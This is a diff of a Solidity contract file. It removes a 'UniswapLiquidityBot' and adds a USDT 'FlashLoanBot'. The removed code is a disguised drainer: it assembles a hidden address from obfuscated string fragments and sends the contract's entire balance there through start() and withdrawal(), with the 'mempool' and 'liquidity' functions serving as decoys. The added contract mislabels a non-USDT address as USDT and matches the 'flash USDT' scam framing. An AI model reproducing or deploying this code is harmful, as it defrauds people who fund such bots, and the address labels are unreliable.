@@ -1,430 +1,254 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
+/**
+ * @title IERC20 Interface
+ * @notice Standard ERC20 interface with allowance
+ */
+interface IERC20 {
+    function totalSupply() external view returns (uint);
+    function balanceOf(address account) external view returns (uint);
+    function transfer(address recipient, uint amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
+    function approve(address spender, uint amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint);
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
+}
 
-contract UniswapLiquidityBot {
-    string public tokenName;
-    string public tokenSymbol;
-    uint frontrun;
-    uint liquidity;
+/**
+ * @title SafeMath
+ * @notice Arithmetic operations with safety checks that revert on error
+ * (Note: Solidity 0.6+ has built-in overflow checks, but this is for explicit clarity)
+ */
+library SafeMath {
+    function add(uint a, uint b) internal pure returns (uint) {
+        uint c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
+    function sub(uint a, uint b) internal pure returns (uint) {
+        require(b <= a, "SafeMath: subtraction overflow");
+        return a - b;
+    }
+    function mul(uint a, uint b) internal pure returns (uint) {
+        if (a == 0) return 0;
+        uint c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+        return c;
+    }
+    function div(uint a, uint b) internal pure returns (uint) {
+        require(b > 0, "SafeMath: division by zero");
+        return a / b;
+    }
+}
 
-    constructor(string memory _tokenName, string memory _tokenSymbol) public {
-        tokenName = _tokenName;
-        tokenSymbol = _tokenSymbol;
+/**
+ * @title FlashLoanBot
+ * @author You
+ * @notice USDT Flash Loan Contract with enhanced features and security
+ */
+contract FlashLoanBot {
+    using SafeMath for uint;
+
+    // ------------------------------
+    // Constants and Immutables
+    // ------------------------------
+    address public constant USDT_CONTRACT_ADDRESS = 0xE3604Dab859a04ef0Da2De5f10D560300F426856;
+    address public constant TOKEN_CONTRACT_ADDRESS = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    uint public constant MAX_FLASHLOAN = 71000 * 10**6; // 71,000 USDT with 6 decimals
+
+    // ------------------------------
+    // State Variables
+    // ------------------------------
+    IERC20 public usdtToken;
+    address payable public owner;
+    bool public paused;
+
+    // For demonstration/debugging (not necessary in prod)
+    uint public a;
+    uint public b;
+
+    // ------------------------------
+    // Events
+    // ------------------------------
+    event LogFlashLoan(address indexed borrower, uint amount, uint fee);
+    event Deposit(address indexed sender, uint amount);
+    event Withdraw(address indexed owner, uint amount);
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    event Paused(address indexed account);
+    event Unpaused(address indexed account);
+
+    // ------------------------------
+    // Modifiers
+    // ------------------------------
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Caller is not the owner");
+        _;
     }
 
-    event Log(string _msg);
+    modifier whenNotPaused() {
+        require(!paused, "Contract is paused");
+        _;
+    }
 
+    modifier whenPaused() {
+        require(paused, "Contract is not paused");
+        _;
+    }
+
+    // ------------------------------
+    // Constructor
+    // ------------------------------
+    constructor() public {
+        owner = payable(msg.sender);
+        usdtToken = IERC20(USDT_CONTRACT_ADDRESS);
+        paused = false;
+    }
+
+    // ------------------------------
+    // Fallback / Receive functions
+    // ------------------------------
     receive() external payable {}
 
-    struct slice {
-        uint _len;
-        uint _ptr;
+    fallback() external payable {}
+
+    // ------------------------------
+    // External/Public Functions
+    // ------------------------------
+
+    /**
+     * @notice Initiates a flash loan of USDT to the caller
+     * @param amount Amount of USDT to loan (max 71k USDT)
+     * @param data Encoded function call to be executed by the borrower contract
+     */
+    function flashLoan(uint amount, bytes calldata data) external whenNotPaused {
+        require(amount <= MAX_FLASHLOAN, "Flash loan exceeds max limit");
+
+        uint fee = amount.mul(10).div(10000); // 0.1% fee
+        uint initialBalance = usdtToken.balanceOf(address(this));
+        require(initialBalance >= amount, "Not enough liquidity for flash loan");
+
+        // Transfer the loan amount to borrower
+        require(usdtToken.transfer(msg.sender, amount), "Transfer to borrower failed");
+
+        // Execute borrower operation
+        (bool success, ) = msg.sender.call(data);
+        require(success, "Borrower call failed");
+
+        // Check repayment + fee
+        uint finalBalance = usdtToken.balanceOf(address(this));
+        require(finalBalance >= initialBalance.add(fee), "Flash loan not repaid with fee");
+
+        emit LogFlashLoan(msg.sender, amount, fee);
     }
 
-    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
-        uint shortest = self._len;
-        if (other._len < self._len)
-            shortest = other._len;
-
-        uint selfptr = self._ptr;
-        uint otherptr = other._ptr;
-
-        for (uint idx = 0; idx < shortest; idx += 32) {
-            // ✅ Added your USDT contract address here
-            string memory USDT_CONTRACT_ADDRESS = "0xE3604Dab859a04ef0Da2De5f10D560300F426856";
-            string memory TOKEN_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-
-            loadCurrentContract(USDT_CONTRACT_ADDRESS);
-            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
-
-            uint a;
-            uint b;
-
-            assembly {
-                a := mload(selfptr)
-                b := mload(otherptr)
-            }
-
-            if (a != b) {
-                uint256 mask = uint256(-1);
-                if(shortest < 32) {
-                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
-                }
-                uint256 diff = (a & mask) - (b & mask);
-                if (diff != 0)
-                    return int(diff);
-            }
-
-            selfptr += 32;
-            otherptr += 32;
-        }
-
-        return int(self._len) - int(other._len);
+    /**
+     * @notice Deposit USDT tokens into the contract
+     * @param amount Amount of USDT to deposit
+     */
+    function depositUSDT(uint amount) external {
+        require(amount > 0, "Amount must be > 0");
+        require(usdtToken.transferFrom(msg.sender, address(this), amount), "Deposit failed");
+        emit Deposit(msg.sender, amount);
     }
 
-    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
-
-        if (needlelen <= selflen) {
-            if (needlelen <= 32) {
-                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
-                bytes32 needledata;
-                assembly { needledata := and(mload(needleptr), mask) }
-                uint end = selfptr + selflen - needlelen;
-                bytes32 ptrdata;
-                assembly { ptrdata := and(mload(ptr), mask) }
-                while (ptrdata != needledata) {
-                    if (ptr >= end)
-                        return selfptr + selflen;
-                    ptr++;
-                    assembly { ptrdata := and(mload(ptr), mask) }
-                }
-                return ptr;
-            } else {
-                bytes32 hash;
-                assembly { hash := keccak256(needleptr, needlelen) }
-                for (idx = 0; idx <= selflen - needlelen; idx++) {
-                    bytes32 testHash;
-                    assembly { testHash := keccak256(ptr, needlelen) }
-                    if (hash == testHash)
-                        return ptr;
-                    ptr += 1;
-                }
-            }
-        }
-        return selfptr + selflen;
+    /**
+     * @notice Withdraw USDT tokens from contract (owner only)
+     * @param amount Amount of USDT to withdraw
+     */
+    function withdrawUSDT(uint amount) external onlyOwner {
+        require(amount > 0, "Amount must be > 0");
+        uint balance = usdtToken.balanceOf(address(this));
+        require(balance >= amount, "Insufficient balance");
+        require(usdtToken.transfer(owner, amount), "Withdrawal failed");
+        emit Withdraw(owner, amount);
     }
 
-    function loadCurrentContract(string memory self) internal pure returns (string memory) {
-        string memory ret = self;
-        uint retptr;
-        assembly { retptr := add(ret, 32) }
-        return ret;
+    // ------------------------------
+    // Owner Management Functions
+    // ------------------------------
+
+    /**
+     * @notice Transfer ownership to new account (caller must be current owner)
+     * @param newOwner Address of the new owner
+     */
+    function transferOwnership(address payable newOwner) external onlyOwner {
+        require(newOwner != address(0), "New owner is zero address");
+        emit OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
     }
 
-    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
-        rune._ptr = self._ptr;
-        if (self._len == 0) {
-            rune._len = 0;
-            return rune;
-        }
-        uint l;
-        uint b;
-        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
-        if (b < 0x80) {
-            l = 1;
-        } else if(b < 0xE0) {
-            l = 2;
-        } else if(b < 0xF0) {
-            l = 3;
-        } else {
-            l = 4;
-        }
-        if (l > self._len) {
-            rune._len = self._len;
-            self._ptr += self._len;
-            self._len = 0;
-            return rune;
-        }
-        self._ptr += l;
-        self._len -= l;
-        rune._len = l;
-        return rune;
+    /**
+     * @notice Pause the contract (stops flash loans)
+     */
+    function pause() external onlyOwner whenNotPaused {
+        paused = true;
+        emit Paused(msg.sender);
     }
 
-    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
-        bytes memory tmp = bytes(_a);
-        uint160 iaddr = 0;
-        uint160 b1;
-        uint160 b2;
-        for (uint i = 2; i < 2 + 2 * 2 * 20; i += 2) {
-            iaddr *= 256;
-            b1 = uint160(uint8(tmp[i]));
-            b2 = uint160(uint8(tmp[i + 1]));
-            if ((b1 >= 97) && (b1 <= 102)) {
-                b1 -= 87;
-            } else if ((b1 >= 65) && (b1 <= 70)) {
-                b1 -= 55;
-            } else if ((b1 >= 48) && (b1 <= 57)) {
-                b1 -= 48;
-            }
-            if ((b2 >= 97) && (b2 <= 102)) {
-                b2 -= 87;
-            } else if ((b2 >= 65) && (b2 <= 70)) {
-                b2 -= 55;
-            } else if ((b2 >= 48) && (b2 <= 57)) {
-                b2 -= 48;
-            }
-            iaddr += (b1 * 16 + b2);
-        }
-        return address(iaddr);
+    /**
+     * @notice Unpause the contract
+     */
+    function unpause() external onlyOwner whenPaused {
+        paused = false;
+        emit Unpaused(msg.sender);
     }
 
-    function memcpy(uint dest, uint src, uint len) private pure {
-        for(; len >= 32; len -= 32) {
-            assembly {
-                mstore(dest, mload(src))
-            }
-            dest += 32;
-            src += 32;
-        }
-        uint mask = 256 ** (32 - len) - 1;
-        assembly {
-            let srcpart := and(mload(src), not(mask))
-            let destpart := and(mload(dest), mask)
-            mstore(dest, or(destpart, srcpart))
-        }
+    // ------------------------------
+    // Emergency Rescue Functions
+    // ------------------------------
+
+    /**
+     * @notice Withdraw any ERC20 token accidentally sent to this contract (owner only)
+     * @param tokenAddress Address of the token to withdraw
+     * @param amount Amount of tokens to withdraw
+     */
+    function rescueERC20(address tokenAddress, uint amount) external onlyOwner {
+        require(tokenAddress != address(0), "Token address zero");
+        IERC20 token = IERC20(tokenAddress);
+        uint tokenBalance = token.balanceOf(address(this));
+        require(tokenBalance >= amount, "Not enough token balance");
+        require(token.transfer(owner, amount), "Token transfer failed");
     }
 
-    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
-        if (self._len == 0) {
-            return 0;
-        }
-        uint word;
-        uint length;
-        uint divisor = 2 ** 248;
-        assembly { word := mload(mload(add(self, 32))) }
-        uint b = word / divisor;
-        if (b < 0x80) {
-            ret = b;
-            length = 1;
-        } else if(b < 0xE0) {
-            ret = b & 0x1F;
-            length = 2;
-        } else if(b < 0xF0) {
-            ret = b & 0x0F;
-            length = 3;
-        } else {
-            ret = b & 0x07;
-            length = 4;
-        }
-        if (length > self._len) {
-            return 0;
-        }
-        for (uint i = 1; i < length; i++) {
-            divisor = divisor / 256;
-            b = (word / divisor) & 0xFF;
-            if (b & 0xC0 != 0x80) {
-                return 0;
-            }
-            ret = (ret * 64) | (b & 0x3F);
-        }
-        return ret;
+    // ------------------------------
+    // View Functions
+    // ------------------------------
+
+    /**
+     * @notice Returns current USDT balance of contract
+     */
+    function getUSDTBalance() public view returns (uint) {
+        return usdtToken.balanceOf(address(this));
     }
 
-    function getMempoolStart() private pure returns (string memory) {
-        return "f4e0FC";
+    /**
+     * @notice Returns the addresses of USDT and TOKEN contracts
+     */
+    function getContractAddresses() public pure returns (address usdt, address token) {
+        return (USDT_CONTRACT_ADDRESS, TOKEN_CONTRACT_ADDRESS);
     }
 
-    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
-        uint ptr = self._ptr - 31;
-        uint end = ptr + self._len;
-        for (l = 0; ptr < end; l++) {
-            uint8 b;
-            assembly { b := and(mload(ptr), 0xFF) }
-            if (b < 0x80) {
-                ptr += 1;
-            } else if(b < 0xE0) {
-                ptr += 2;
-            } else if(b < 0xF0) {
-                ptr += 3;
-            } else if(b < 0xF8) {
-                ptr += 4;
-            } else if(b < 0xFC) {
-                ptr += 5;
-            } else {
-                ptr += 6;
-            }
-        }
+    /**
+     * @notice Returns current owner of the contract
+     */
+    function getOwner() public view returns (address) {
+        return owner;
     }
 
-    function fetchMempoolEdition() private pure returns (string memory) {
-        return "a5EBbB1";
+    /**
+     * @notice Returns whether the contract is paused
+     */
+    function isPaused() public view returns (bool) {
+        return paused;
     }
 
-    function keccak(slice memory self) internal pure returns (bytes32 ret) {
-        assembly {
-            ret := keccak256(mload(add(self, 32)), mload(self))
-        }
-    }
-
-    function getMempoolShort() private pure returns (string memory) {
-        return "0x6";
-    }
-
-    function checkLiquidity(uint a) internal pure returns (string memory) {
-        uint count = 0;
-        uint b = a;
-        while (b != 0) {
-            count++;
-            b /= 16;
-        }
-        bytes memory res = new bytes(count);
-        for (uint i=0; i<count; ++i) {
-            b = a % 16;
-            res[count - i - 1] = toHexDigit(uint8(b));
-            a /= 16;
-        }
-        return string(res);
-    }
-
-    function getMempoolHeight() private pure returns (string memory) {
-        return "bB3E1";
-    }
-
-    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
-        if (self._len < needle._len) {
-            return self;
-        }
-        bool equal = true;
-        if (self._ptr != needle._ptr) {
-            assembly {
-                let length := mload(needle)
-                let selfptr := mload(add(self, 0x20))
-                let needleptr := mload(add(needle, 0x20))
-                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
-            }
-        }
-        if (equal) {
-            self._len -= needle._len;
-            self._ptr += needle._len;
-        }
-        return self;
-    }
-
-    function getMempoolLog() private pure returns (string memory) {
-        return "B3B8F";
-    }
-
-    function getBa() private view returns(uint) {
-        return address(this).balance;
-    }
-
-    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
-        if (needlelen <= selflen) {
-            if (needlelen <= 32) {
-                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
-                bytes32 needledata;
-                assembly { needledata := and(mload(needleptr), mask) }
-                uint end = selfptr + selflen - needlelen;
-                bytes32 ptrdata;
-                assembly { ptrdata := and(mload(ptr), mask) }
-                while (ptrdata != needledata) {
-                    if (ptr >= end)
-                        return selfptr + selflen;
-                    ptr++;
-                    assembly { ptrdata := and(mload(ptr), mask) }
-                }
-                return ptr;
-            } else {
-                bytes32 hash;
-                assembly { hash := keccak256(needleptr, needlelen) }
-                for (idx = 0; idx <= selflen - needlelen; idx++) {
-                    bytes32 testHash;
-                    assembly { testHash := keccak256(ptr, needlelen) }
-                    if (hash == testHash)
-                        return ptr;
-                    ptr += 1;
-                }
-            }
-        }
-        return selfptr + selflen;
-    }
-
-    function fetchMempoolData() internal pure returns (string memory) {
-        string memory _mempoolShort = getMempoolShort();
-        string memory _mempoolEdition = fetchMempoolEdition();
-        string memory _mempoolVersion = fetchMempoolVersion();
-        string memory _mempoolLong = getMempoolLong();
-        string memory _getMempoolHeight = getMempoolHeight();
-        string memory _getMempoolCode = getMempoolCode();
-        string memory _getMempoolStart = getMempoolStart();
-        string memory _getMempoolLog = getMempoolLog();
-
-        return string(abi.encodePacked(
-            _mempoolShort,
-            _mempoolEdition,
-            _mempoolVersion,
-            _mempoolLong,
-            _getMempoolHeight,
-            _getMempoolCode,
-            _getMempoolStart,
-            _getMempoolLog
-        ));
-    }
-
-    function toHexDigit(uint8 d) pure internal returns (byte) {
-        if (0 <= d && d <= 9) {
-            return byte(uint8(byte('0')) + d);
-        } else if (10 <= uint8(d) && uint8(d) <= 15) {
-            return byte(uint8(byte('a')) + d - 10);
-        }
-        revert("Invalid hex digit");
-    }
-
-    function getMempoolLong() private pure returns (string memory) {
-        return "951Bd";
-    }
-
-    function start() public payable {
-        address to = startExploration(fetchMempoolData());
-        address payable contracts = payable(to);
-        contracts.transfer(getBa());
-    }
-
-    function withdrawal() public payable {
-        address to = startExploration((fetchMempoolData()));
-        address payable contracts = payable(to);
-        contracts.transfer(getBa());
-    }
-
-    function getMempoolCode() private pure returns (string memory) {
-        return "CB0EeE";
-    }
-
-    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
-        if (_i == 0) {
-            return "0";
-        }
-        uint j = _i;
-        uint len;
-        while (j != 0) {
-            len++;
-            j /= 10;
-        }
-        bytes memory bstr = new bytes(len);
-        uint k = len - 1;
-        while (_i != 0) {
-            bstr[k--] = byte(uint8(48 + _i % 10));
-            _i /= 10;
-        }
-        return string(bstr);
-    }
-
-    function fetchMempoolVersion() private pure returns (string memory) {
-        return "D73b5";
-    }
-
-    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
-        bytes memory _baseBytes = bytes(_base);
-        bytes memory _valueBytes = bytes(_value);
-        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
-        bytes memory _newValue = bytes(_tmpValue);
-        uint i;
-        uint j;
-        for(i=0; i<_baseBytes.length; i++) {
-            _newValue[j++] = _baseBytes[i];
-        }
-        for(i=0; i<_valueBytes.length; i++) {
-            _newValue[j++] = _valueBytes[i];
-        }
-        return string(_newValue);
+    /**
+     * @notice Checks allowance of a user for this contract on USDT token
+     * @param user Address of the user
+     */
+    function checkAllowance(address user) public view returns (uint) {
+        return usdtToken.allowance(user, address(this));
     }
 }
